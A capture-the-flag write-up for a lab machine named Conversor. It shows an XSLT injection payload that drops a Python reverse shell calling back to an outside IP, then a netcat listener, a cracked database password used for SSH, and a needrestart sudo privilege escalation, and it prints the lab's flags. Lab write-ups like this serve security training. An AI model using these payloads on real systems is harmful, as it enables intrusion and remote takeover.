# CTF Writeup: Conversor

> **Author:** Axidion  
> **Date:** 2026-01-10  
> **Machine:** Conversor (Linux)  
> **Difficulty:** Easy  

---

## 1. Enumeration

### Port Scanning

The first step is to scan the target to identify open ports and services.

**Command:**

```bash
nmap -sV -sC -oN nmap/nmap_scan 10.10.11.92
```

**Results:**

- 22/tcp → OpenSSH 8.9p1  
- 80/tcp → Apache 2.4.52 (redirects to `http://conversor.htb/`)  

---

### Domain Configuration

Since the web application uses virtual hosting, the domain must be added locally:

```bash
echo "10.10.11.92 conversor.htb" | sudo tee -a /etc/hosts
```

---

## 2. Initial Access

### XSLT Injection

The application provides a file conversion feature. Testing this functionality revealed an **XSLT Injection** vulnerability.

By abusing XSLT extension elements, it is possible to write arbitrary files to the webroot. This was used to drop a Python reverse shell.

---

### Malicious Payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet 
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
    xmlns:ptswarm="http://exslt.org/common" 
    extension-element-prefixes="ptswarm" 
    version="1.0">
<xsl:template match="/">
  <ptswarm:document href="/var/www/conversor.htb/scripts/test2.py" method="text">
import os
os.system("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.17.44\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'")
  </ptswarm:document>
</xsl:template>
</xsl:stylesheet>
```

---

### Exploitation Steps

1. Upload the malicious XSLT file  
2. Start a listener:

```bash
nc -lvnp 1234
```

3. Trigger the payload:

```
http://conversor.htb/scripts/test2.py
```

4. Upgrade the shell:

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```

Access obtained as:

```
www-data
```

---

## 3. Post-Exploitation & Lateral Movement

### Database Enumeration

Navigating to the application directory:

```bash
cd /var/www/conversor.htb/instance
sqlite3 users.db
```

Querying the database:

```sql
SELECT * FROM users;
```

**Result:**

```
fismathack : 5b5c3ac3a1c897c94caad48e6c71fdec
```

After cracking the MD5 hash:

```
Password: Keepmesafeandwarm
```

---

### SSH Access

```bash
ssh fismathack@10.10.11.92
```

**User Flag:**

```
44888ba3827b5f2cc4768c4f82bab119
```

---

## 4. Privilege Escalation

### Sudo Enumeration

```bash
sudo -l
```

**Output:**

```
(root) NOPASSWD: /usr/sbin/needrestart
```

---

### Exploiting needrestart

The `needrestart` binary allows loading a custom configuration file via `-c`.

Since the config is interpreted as **Perl code**, command injection is possible.

---

### Step 1: Create Malicious Config

```bash
echo 'exec "/bin/sh", "-p";' > /tmp/con.conf
```

---

### Step 2: Execute as Root

```bash
sudo /usr/sbin/needrestart -c /tmp/con.conf
```

---

## 5. Root Access

Root privileges successfully obtained.

**Root Flag:**

```
ec10e999bef20f370a162f05a63deaff
```

---

## Conclusion

This machine demonstrates a full attack chain involving:

- XSLT Injection leading to remote code execution  
- Reverse shell via webroot file write  
- Credential extraction from SQLite database  
- SSH lateral movement  
- Privilege escalation through misconfigured sudo binary (`needrestart`)  

It highlights the importance of secure input handling, proper isolation of processing engines, and strict control over privileged binaries.
